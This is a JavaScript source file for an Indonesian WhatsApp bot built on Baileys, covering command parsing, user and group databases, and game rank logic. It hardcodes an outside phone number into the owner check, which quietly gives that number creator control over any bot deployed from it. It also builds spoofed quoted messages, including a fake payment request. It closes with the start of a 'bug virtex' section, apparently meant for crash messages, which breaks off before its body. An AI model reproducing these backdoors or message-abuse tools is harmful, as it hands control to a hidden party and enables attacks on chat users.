/*

DILARANG MENYEBARKAN SC, HARGAI UANG LU DAN CREATOR

*/

const { 
BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
generateWAMessageFromContent, 
proto, 
generateWAMessageContent, 
generateWAMessage, 
prepareWAMessageMedia, 
downloadContentFromMessage,
areJidsSameUser, 
getContentType,
delay
} = require('@whiskeysockets/baileys')

const fs = require('fs')
const fetch = require('node-fetch')
const translate = require("@vitalets/google-translate-api");
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const cheerio = require('cheerio')
const cookie = require('cookie')
const path = require('path')
const os = require('os')
const toMS = require("ms");
const dns = require("dns")
const ms = require("parse-ms");
const nodemailer = require('nodemailer')
const canvafy = require("canvafy")
const nou = require("node-os-utils");
const gtts = require('node-gtts')
const yts = require ("yt-search");
const FormData = require("form-data");
const crypto = require('crypto')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const cron = require('node-cron')
const PhoneNumber = require('awesome-phonenumber')
const gsmarena = require('gsmarena-api');
const { performance } = require('perf_hooks')
const { sizeFormatter } = require("human-readable");
const similarity = require('similarity')
const didyoumean = require('didyoumean');
const ffmpeg = require('fluent-ffmpeg')
const { jadibot, stopjadibot, listjadibot } = require('./qioo_clone')
const threshold = 0.72
let pj = '`'
let numm = '6285643115199@s.whatsapp.net'

let format = sizeFormatter({
std: "JEDEC", // 'SI' (default) | 'IEC' | 'JEDEC'
decimalPlaces: 2,
keepTrailingZeroes: false,
render: (literal, symbol) => `${literal} ${symbol}B`,
});
var dbs = []
global.dbc = dbs

//▢━━━━━━━━━━━━━━「 SCRAPERR 」━━━━━━━━━━━━━━▢
const _prem = require("./lib/premium");
const _mingguan = require("./lib/mingguan");
const _bulanan = require("./lib/bulanan");
const _sewa = require("./lib/sewa");
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const { resetToxic, getToxic, toxicAdd, isToxic } = require("./lib/toxic");
const { resetAntilink2, getAntilink2, Antilink2Add, isAntilinkk2 } = require("./lib/Antilink2");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { addRespons, checkRespons, deleteRespons } = require('./lib/respon');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
const { isSetOpen, addSetOpen, removeSetOpen, changeSetOpen, getTextSetOpen } = require("./lib/setopen");
const { isSetClose, addSetClose, removeSetClose, changeSetClose, getTextSetClose } = require("./lib/setclose");
const { casinoSave, setCasino, deleteCasino } = require("./lib/casino");
const spamdetek = require("./lib/antispam");
const { generateProfilePicture, removeEmojis, smsg, tanggal, formatp, formatDate, getTime, isUrl, sleep, clockString, runtime, bytesToSize, fetchJson, getBuffer, jsonformat, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { TelegraPh, webp2mp4File, UploadFileUgu } = require('./lib/uploader')
const { quote } = require('./lib/quote') 
const { pinterest } = require('./lib/pinterest')
const { joox, jooxdl, herodetail, herolist, gempa, CekNik, wallpaper, wikimedia, quotesAnime, aiovideodl } = require('./lib/scraper')
const { tiktokdl } = require('tiktokdl') 
const { remini } = require('./lib/remini')
const { ngazap } = require ('./lib/ngazap')
const ffstalk = require('./lib/ffstalk')
const mlstalk = require('./lib/mlstalk')
const { processing, remini2, diff, jarak, tiktokSearchVideo, clean, ssweb, ephoto, searchSpotifyTracks, QiooBotika, GPTwordle, txt2img, faceSwap, getJobs, transfrom, listSampler, listModels, getModels, qiooaitext, qiooaigambar, CarbonifyV1, CarbonifyV2, convertAngka, text2img, scsearch, capcutdl, igdown, twiterdl, snapsave, GDriveDl, snapsavev2, youtubedlv2, convertv2, jadwalSholat, findKodeDaerah, downloadCapcut, searchTemplates, detailTemplates, GoogleImage, mediafireDl, stickerSearch } = require('./lib/vreden-core')
const { y2mateplay, y2matemp3, y2matemp4 } = require('./lib/y2mate')
const { color, bgcolor } = require('./lib/color')
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const afk = require("./lib/afk");


//▢━━━━━━━━━━━━━━「 DATA BASE  」━━━━━━━━━━━━━━▢
let setiker = JSON.parse(fs.readFileSync('./database/stik.json'))
let audionye = JSON.parse(fs.readFileSync('./database/vn.json'))
let imagenye = JSON.parse(fs.readFileSync('./database/image.json'))
let videonye = JSON.parse(fs.readFileSync('./database/video.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
let set_open = JSON.parse(fs.readFileSync('./database/set_open.json'));
let set_close = JSON.parse(fs.readFileSync('./database/set_close.json'));
let _afk = JSON.parse(fs.readFileSync('./database/afk.json'));
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let opengc = JSON.parse(fs.readFileSync('./database/opengc.json'));
let closegc = JSON.parse(fs.readFileSync('./database/closegc.json'));
let banned = JSON.parse(fs.readFileSync('./database/banned.json'))
let mess = JSON.parse(fs.readFileSync('./mess.json'));
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let mingguan = JSON.parse(fs.readFileSync('./database/mingguan.json'));
let bulanan = JSON.parse(fs.readFileSync('./database/bulanan.json'));
let toxic = JSON.parse(fs.readFileSync('./database/toxic.json'));
let Antilinkk2 = JSON.parse(fs.readFileSync('./database/antilinko2.json'));
let blacklist = JSON.parse(fs.readFileSync('./database/blacklist.json'));
let toxicc = JSON.parse(fs.readFileSync('./database/toxicc.json'));
let listCmd = JSON.parse(fs.readFileSync('./database/listcmd.json'));
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let modsNumber = JSON.parse(fs.readFileSync('./database/modsNumber.json'));
let responDB = JSON.parse(fs.readFileSync('./database/respon.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let openaipc = JSON.parse(fs.readFileSync('./database/openaipc.json'))

const enter = '\n'

//▢━━━━━━━━━━━━━━「 GAME DATABASE 」━━━━━━━━━━━━━━▢
let tictactoe = [];
let kuis = []
const kuismath = {}
const _family100 = {}
const tebakgambar = {}
const tebakgame ={}
const tebakhero ={}
const tebakff ={}
const tebakaplikasi ={}
const tebakkata = {}
const asahotak = {}
const lengkapikalimat = {}
const tebakbendera = {}
const siapaaku = {}
const tebakkalimat = {}
const caklontong = {}
const susunkata = {}
const tekateki = {}
const tebakkabupaten = {}
const tebakkimia = {}
const tebaklirik = {}
const tebaktebakan = {}
const petakbom = {}

//▢━━━━━━━━━━━━━━「 BANDWITH  」━━━━━━━━━━━━━━▢
async function checkBandwidth() {
let ind = 0;
let out = 0;
for (let i of await require("node-os-utils").netstat.stats()) {
ind += parseInt(i.inputBytes);
out += parseInt(i.outputBytes);
}
return {
download: format(ind),
upload: format(out),
};
}

//▢━━━━━━━━━━━━━━「 MODULE EXPORTS 」━━━━━━━━━━━━━━▢
moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = vreden = async (vreden, m, chatUpdate, mek, store, setting, isSetWelcome, getTextSetWelcome, set_welcome_db, set_left_db, isSetLeft, getTextSetLeft) => {
try {
const { ownerNumber, tiktokk, instagram, gcwa, ownerName, botName, footer, location, eggsnya, netsnya, apiuser, cred, panel, pathimg, idsaluran, namasaluran, gamewaktu, toxicCount, Antilink2Count, limitCount } = setting
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
var budy = (typeof m.text == 'string' ? m.text : '')
const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0];
if (m && type == "protocolMessage") vreden.ev.emit("message.delete", m.message.protocolMessage.key);
const botNumber = await vreden.decodeJid(vreden.user.id)
const isCreator = [numm, ...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
const isCommand2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const command = setting.prefix ? isCommand : isCommand2
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
let footxt = `${footer}`
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const jam = moment().format("HH:mm:ss z")
const jam6 = moment().format("HH:mm z")
const time2 = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const Kalender91 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
const datee = moment.tz('Asia/Jakarta').format(`yyyy-MM-DD`)
 if(time2 < "23:59:00"){
var ucapanWaktu = `[ ${jam6} ] Malam 🌌`
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = `[ ${jam6} ] Sore 🌃`
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = `[ ${jam6} ] Sore 🌅`
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = `[ ${jam6} ] Siang 🏙`
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = `[ ${jam6} ] Pagi 🌄`
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = `[ ${jam6} ] Pagi 🌉`
 } 

//▢━━━━━━━━━━━━━━「 GROUP FUNGSI  」━━━━━━━━━━━━━━▢
const groupMetadata = m.isGroup ? await vreden.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isBan = banned.includes(m.sender)
const isPremium = isCreator ? true : _prem.checkPremiumUser(m.sender, premium)
const isMingguan = _mingguan.checkMingguanUser(m.sender, mingguan)
const isBulanan = _bulanan.checkBulananUser(m.sender, bulanan)
const isSewa = _sewa.checkSewaGroup(m.chat, sewa)
const isBlacklist = blacklist.includes(m.sender) ? true : false
const isAutoAiPc = openaipc.includes(botNumber) ? true : false
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
const gcounti = setting.gcount
const gcount = isPremium ? gcounti.prem : gcounti.user
let timestamp = speed();
let latensi = speed() - timestamp
dbs.push({id: m.key.id, m}); 

//━━━━━━━━━━━━━━━[ FUNCIONT]━━━━━━━━━━━━━━━━━//
const ments = (text) => {return text.match('@') ? [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []}
const nomore = m.sender.replace(/[^0-9]/g, '')

const reply = (teks) => {
return vreden.sendMessage(m.chat, { text: teks, mentions: ments(teks) }, {quoted: m})
}

//Function Polling
vreden.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};
vreden.sendteks = async(chatId, text = '', quoted = '', opts = {}) => {
return vreden.sendMessage(chatId, { text: text, mentions: await vreden.ments(text), ...opts}, {quoted:quoted})
};
vreden.sendPoll = (jid, name = '', values = [], selectableCount = global.select) => {
return vreden.sendMessage(jid, {poll: { name, values, selectableCount }})
};
// RESPON CMD POLL MESSAGE THE JO BOT
async function getMessage(key){
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id)
return msg?.message
}
return {conversation: '${botName}'}
}

vreden.ev.on('messages.update', async(chatUpdate) => {
for (const { key, update } of chatUpdate) {
if (update.pollUpdates && key.fromMe) {
const pollCreation = await getMessage(key)
if (pollCreation) {
const pollUpdate = await getAggregateVotesInPollMessage({
message: pollCreation,
pollUpdates: update.pollUpdates,
})
const command = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
if (command == undefined) return
const comand = prefix+command
console.log(comand)
vreden.appenTextMessage(comand, chatUpdate)
}
}
}
})


const nebal = (angka) => {
return Math.floor(angka)
}

function hitungmundur(tanggal, bulan, tahun){
let from = new Date(`${bulan} ${tanggal}, ${tahun} 00:00:00`).getTime();
let now = Date.now();
let distance = from - now;
let days = Math.floor(distance / (1000 * 60 * 60 * 24));
let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
let seconds = Math.floor((distance % (1000 * 60)) / 1000);
return days + ' Hari ' + hours + ' Jam ' + minutes + ' Menit '
}

const isEmoji = (emo) => {
let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
let regexEmoji = new RegExp(emoji_ranges, 'gi');
return emo.match(regexEmoji)
}

async function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }

            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}


async function getGcName(groupID) {
try {
let data_name = await vreden.groupMetadata(groupID)
return data_name.subject
} catch (err) {
return '-'
}
}

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
/*if ( m.mtype == 'viewOnceMessage' && m.msg.viewOnce) {
try {
vreden.ev.emit("viewOnceMessage", m);
} catch (err) {
console.error(util.format(err))
}}*/
//━━━━━━━━━━━━━━━[ DATABASE USER ]━━━━━━━━━━━━━━━━━//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? 10000000 : limitCount
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!('rpg' in user)) user.rpg = false
if (!('daftar' in user)) user.daftar = false
if (!('qioo' in user)) user.qioo = false
if (!('chatAi' in user)) user.chatAi = false
if (!('caiId' in user)) user.caiId = 'EKC0Usq_Cs-M_X1oKKiiN1osWRmAU-7NJ8RbA6N-iko'
if (!('caiSesi' in user)) user.caiSesi = ''
if (!('pctime' in user)) user.pctime = ''
if (!('nama' in user)) user.nama = 'Guest'
if (!('otp' in user)) user.otp = randomNomor(1000, 9999)
if (!isNumber(user.glimit)) user.glimit = gcount
if (!isNumber(user.limit)) user.limit = limitUser
if (!isNumber(user.saldo)) user.saldo = 0
if (!isNumber(user.exp)) user.exp = 0
if (!isNumber(user.rank)) user.rank = 700
if (!isNumber(user.level)) user.level = 0
} else global.db.data.users[m.sender] = {
rpg: false,
daftar: false,
qioo: false,
chatAi: false,
caiId: 'EKC0Usq_Cs-M_X1oKKiiN1osWRmAU-7NJ8RbA6N-iko',
caiSesi: '',
pctime: '',
nama: 'Guest',
otp: randomNomor(1000, 9999),
glimit: gcount,
limit: limitUser,
saldo: 0,
exp: 0,
rank: 700,
level: 0
}
} catch (e){
console.log(e)
}

//━━━━━━━━━━━━━━━[ DATABASE CHAT ]━━━━━━━━━━━━━━━━━//
try {
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('goodbye' in chats)) chats.goodbye = setting.auto_leaveMsg
if (!('welcome' in chats)) chats.welcome = setting.auto_welcomeMsg
if (!('antilink' in chats)) chats.antilink = false
if (!('antibot' in chats)) chats.antibot = false
if (!('antilinktt' in chats)) chats.antilinktt = false
if (!('antitoxic' in chats)) chats.antitoxic = false
if (!('antivirtex' in chats)) chats.antivirtex = false
if (!('antiwame' in chats)) chats.antiwame = false
if (!('antiwame2' in chats)) chats.antiwame2 = false
if (!('antilink2' in chats)) chats.antilink2 = false
if (!('autodl' in chats)) chats.autodl = false
if (!('autoaigc' in chats)) chats.autoaigc = false
if (!('kickme' in chats)) chats.kickme = false
if (!('autoaipc' in chats)) chats.autoaipc = false
if (!('keamanan' in chats)) chats.keamanan = false
if (!('mute' in chats)) chats.mute = false
if (!('nsfw' in chats)) chats.nsfw = false
} else global.db.data.chats[m.chat] = {
goodbye: setting.auto_leaveMsg, 
welcome: setting.auto_welcomeMsg,
antilink: false,
antibot: false,
antilinktt: false,
antitoxic: false,
antivirtex: false,
antiwame: false,
antiwame2: false,
antilink2: false,
autodl: false,
autoaigc: false,
kickme: false,
autoaipc: false,
keamanan: false,
mute: false,
nsfw: false
}
} catch (e){
console.log(e)
}

//━━━━━━━━━━━━━━━[ DATABASE RPG ]━━━━━━━━━━━━━━━━━//
try {
let rpg = global.db.data.rpg[m.sender]
if (typeof rpg !== 'object') global.db.data.rpg[m.sender] = {}
if (rpg) {
if (!('rpgspam' in rpg)) rpg.rpgspam = false
if (!('kapal' in rpg)) rpg.kapal = false
if (!('darahkapal' in rpg)) rpg.darahkapal = 100
if (!('pickaxe' in rpg)) rpg.pickaxe = false
if (!('darahpickaxe' in rpg)) rpg.darahpickaxe = 100
if (!('kapak' in rpg)) rpg.kapak = false
if (!('darahkapak' in rpg)) rpg.darahkapak = 100
if (!('bzirah' in rpg)) rpg.bzirah = false
if (!('darahbzirah' in rpg)) rpg.darahbzirah = 100
if (!('pedang' in rpg)) rpg.pedang = false
if (!('darahpedang' in rpg)) rpg.darahpedang = 100
if (!('darahuser' in rpg)) rpg.darahuser = 100
if (!('rumah' in rpg)) rpg.rumah = 0
if (!('besi' in rpg)) rpg.besi = 4
if (!('kayu' in rpg)) rpg.kayu = 2
if (!('emas' in rpg)) rpg.emas = 0
if (!('perak' in rpg)) rpg.perak = 0
if (!('batubara' in rpg)) rpg.batubara = 0
if (!('bulu' in rpg)) rpg.bulu = 0
if (!('kain' in rpg)) rpg.kain = 0
if (!('battleid' in rpg)) rpg.battleid = ""
if (!('wilayah' in rpg)) rpg.wilayah = "indonesia"
if (!('wilayahrumah' in rpg)) rpg.wilayahrumah = "indonesia"
if (!('musuh' in rpg)) rpg.musuh = 0
if (!('ikan' in rpg)) rpg.ikan = 0
if (!('domba' in rpg)) rpg.domba = 0
if (!('sapi' in rpg)) rpg.sapi = 0
if (!('ayam' in rpg)) rpg.ayam = 0
if (!('burutime' in rpg)) rpg.burutime = 0
} else global.db.data.rpg[m.sender] = {
rpgspam: false, 
kapal: false, 
darahkapal: 100, 
pickaxe: false,
darahpickaxe: 100,
kapak: false,
darahkapak: 100,
bzirah: false,
darahbzirah: 100,
pedang: false,
darahpedang: 100,
darahuser: 100, 
rumah: 0,
besi: 4,
kayu: 2,
emas: 0,
perak: 0,
batubara: 0,
bulu: 0,
kain: 0,
battleid: "",
wilayah: "indonesia",
wilayahrumah: "indonesia",
musuh: 0,
ikan: 0,
domba: 0,
sapi: 0,
ayam: 0,
burutime: 0
}
} catch (e){
console.log(e)
}

fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2))

//━━━━━━━━━━━━━━━[ FAKE REPLY ]━━━━━━━━━━━━━━━━━//
let usernomor = await PhoneNumber('+' + m.sender.replace('@s.whatsapp.net', '')).getNumber('international')
let ownnomor = await PhoneNumber('+' + numm.replace('@s.whatsapp.net', '')).getNumber('international')
const fkonk1 = { key: {participant: `${m.sender}`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { conversation: `👤 *${db.data.users[m.sender].nama}*\n🔢 *${usernomor}*` }}
const fkonk2 = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `${db.data.users[m.sender].nama}👤`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${db.data.users[m.sender].nama},;;;\nFN:${db.data.users[m.sender].nama},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const fkonk3 = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `${db.data.users[m.sender].nama}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${db.data.users[m.sender].nama},;;;\nFN:${db.data.users[m.sender].nama},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const fbot = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `${botName}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${db.data.users[m.sender].nama},;;;\nFN:${db.data.users[m.sender].nama},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `628555`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `*${botName}*\n👤 *${db.data.users[m.sender].nama}*\n🔢 *${usernomor}*`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
let fconver = {
	key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`,
		...(m.chat ? { remoteJid: "0@s.whatsapp.net" } : {}),
	},
	message: {
		conversation: `👤 *${db.data.users[m.sender].nama}*\n🔢 *${usernomor}*`,
	},
};
let bakkk = {
	key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`,
		...(m.chat ? { remoteJid: "0@s.whatsapp.net" } : {}),
	},
	message: {
		conversation: `Hallo User👋`,
	},
};

//━━━━━━━━━━━━━━━[ PUBLIC OR SELF ]━━━━━━━━━━━━━━━━━//
if (!vreden.public) {
if (!m.key.fromMe && !isCreator) return
}

//▢━━━━━━━━━━━━━━「 BALANCE ROLE 」━━━━━━━━━━━━━━▢
if (db.data.users[m.sender].exp > 2500) {
try {
avatar = await vreden.profilePictureUrl(m.sender, "image")
} catch {
avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
db.data.users[m.sender].exp = 0
db.data.users[m.sender].level += 1
await sleep(1000)
const levelUp = await new canvafy.LevelUp()
.setAvatar(avatar)
.setBackground("image", "https://telegra.ph/file/d0fce5c840f366526bab7.jpg")
.setUsername(usernomor)
.setBorder("#000000")
.setAvatarBorder("#ff0000")
.setOverlayOpacity(0.7)
.setLevels(db.data.users[m.sender].level - 1,db.data.users[m.sender].level)
.build();
let button = [
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Halo👋\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Halo👋\"}`
              }
           ]
sendButtonImage(m.chat, "*🎉 C O N G R A T S 🎉*", `\n*${db.data.users[m.sender].level - 1}* *➔* *${db.data.users[m.sender].level}*\n\n• 🧬Level Sebelumnya : ${db.data.users[m.sender].level - 1}\n• 🧬Level Baru : ${db.data.users[m.sender].level}\n• Pada Jam : ${new Date().toLocaleString("id-ID")}\n\n\n*Note:*\n_Semakin sering berinteraksi_\n_dengan bot semakin_\n_tinggi level kamu_`, levelUp, button)
}

if (db.data.users[m.sender].rank < 1) {
db.data.users[m.sender].rank = 0
}

function pangkat(idrole) {
var levelRole = db.data.users[idrole].rank
var role = {
rank: 'Bronze I',
name: 'Bronze',
id: 1
}
if (levelRole <= 1000) {
role = {
rank: 'Bronze I',
name: 'Bronze',
id: 1
}
} else if (levelRole <= 1100) {
role = {
rank: 'Bronze II',
name: 'Bronze',
id: 2
}
} else if (levelRole <= 1200) {
role = {
rank: 'Bronze III',
name: 'Bronze',
id: 3
}
} else if (levelRole <= 1300) {
role = {
rank: 'Silver I',
name: 'Silver',
id: 1
}
} else if (levelRole <= 1400) {
role = {
rank: 'Silver II',
name: 'Silver',
id: 2
}
} else if (levelRole <= 1500) {
role = {
rank: 'Silver III',
name: 'Silver',
id: 3
}
} else if (levelRole <= 1600) {
role = {
rank: 'Gold I',
name: 'Gold',
id: 1
}
} else if (levelRole <= 1725) {
role = {
rank: 'Gold II',
name: 'Gold',
id: 2
}
} else if (levelRole <= 1850) {
role = {
rank: 'Gold III',
name: 'Gold',
id: 3
}
} else if (levelRole <= 1975) {
role = {
rank: 'Gold IV',
name: 'Gold',
id: 4
}
} else if (levelRole <= 2100) {
role = {
rank: 'Platinum I',
name: 'Platinum',
id: 1
}
} else if (levelRole <= 2225) {
role = {
rank: 'Platinum II',
name: 'Platinum',
id: 2
}
} else if (levelRole <= 2350) {
role = {
rank: 'Platinum III',
name: 'Platinum',
id: 3
}
} else if (levelRole <= 2475) {
role = {
rank: 'Platinum IV',
name: 'Platinum',
id: 4
}
} else if (levelRole <= 2600) {
role = {
rank: 'Diamond I',
name: 'Diamond',
id: 1
}
} else if (levelRole <= 2750) {
role = {
rank: 'Diamond II',
name: 'Diamond',
id: 2
}
} else if (levelRole <= 2900) {
role = {
rank: 'Diamond III',
name: 'Diamond',
id: 3
}
} else if (levelRole <= 3050) {
role = {
rank: 'Diamond IV',
name: 'Diamond',
id: 4
}
} else if (levelRole <= 3200) {
role = {
rank: 'Heroic',
name: 'Heroic',
id: 0
}
} else if (levelRole <= 3500) {
role = {
rank: 'Heroic ✩',
name: 'Heroic',
id: 1
}
} else if (levelRole <= 4000) {
role = {
rank: 'Heroic ✩✩',
name: 'Heroic',
id: 2
}
} else if (levelRole <= 4350) {
role = {
rank: 'Heroic ✩✩✩',
name: 'Heroic',
id: 3
}
} else if (levelRole <= 5050) {
role = {
rank: 'Master ✯',
name: 'Master',
id: 1
}
} else if (levelRole <= 5400) {
role = {
rank: 'Master ✯✯',
name: 'Master',
id: 2
}
} else if (levelRole <= 6500) {
role = {
rank: 'Master ✯✯✯',
name: 'Master',
id: 3
}
} else if (levelRole <= 7150) {
role = {
rank: 'GrandMaster',
name: 'GrandMaster',
id: 0
}
} else if (levelRole <= 7700) {
role = {
rank: 'GrandMaster ✩',
name: 'GrandMaster',
id: 1
}
} else if (levelRole <= 9100) {
role = {
rank: 'GrandMaster ✩✩',
name: 'GrandMaster',
id: 2
}
} else if (levelRole <= 10800) {
role = {
rank: 'GrandMaster ✩✩✩',
name: 'GrandMaster',
id: 3
}
} else if (levelRole <= 99999999999999999999999999999) {
role = {
rank: 'GrandMaster ✩✩✩✩',
name: 'GrandMaster',
id: 4
}
}
return role
}
//━━━━━━━━━━━━━━━[ QIOO BUG VIRTEX ]━━━━━━━━━━━━━━━━━//

async function vredenbugone(chat) {
